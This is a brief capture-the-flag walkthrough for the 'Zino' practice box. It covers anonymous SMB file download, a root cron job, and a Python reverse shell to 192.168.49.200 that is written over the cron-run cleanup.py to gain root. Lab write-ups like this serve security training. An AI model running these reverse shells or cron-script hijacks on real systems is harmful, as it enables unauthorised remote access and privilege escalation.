### SMB since autorecon is super useful this time
```bash
smbclient //$IP/zino -U=anonymous

smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

```
$ ls -lh /usr/sbin/apache2
-rwxr-xr-x 1 root root 672K Oct 15  2019 /usr/sbin/apache2

*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

```python
import socket,subprocess,os;
import pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.49.200",80));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2); 

pty.spawn("bash");
```

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.200",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > /var/www/html/booked/cleanup.py
```

It's a easy box. Just don't get stuck on getting reverse shell with specific ports like 80 or 8003. 21 is the working one.
Simply use it will just work.

Besides, use a webshell when the RCE exploit is not stable enough.

* https://imtodess.gitbook.io/writeups/pg/get-to-work/linux/zino
* https://github.com/Ministrex/Pentest-Everything/blob/Main/writeups/pg-practice/linux/zino.md
